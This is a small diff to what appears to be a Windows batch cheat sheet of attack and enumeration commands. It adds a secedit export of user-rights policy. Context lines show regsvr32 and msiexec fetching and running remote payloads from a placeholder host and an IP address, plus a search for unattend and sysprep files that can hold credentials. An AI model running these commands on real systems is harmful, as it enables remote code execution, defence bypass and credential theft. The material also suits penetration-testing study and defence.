@@ -505,6 +505,8 @@ regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
 ECHO ============================
 msiexec /q /i http://192.168.100.3/tmp/cmd.png
 ECHO ============================
+secedit /export /cfg secpolicy.inf /areas USER_RIGHTS
+ECHO ============================
 dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
 ECHO ============================
 ECHO ***************************************************
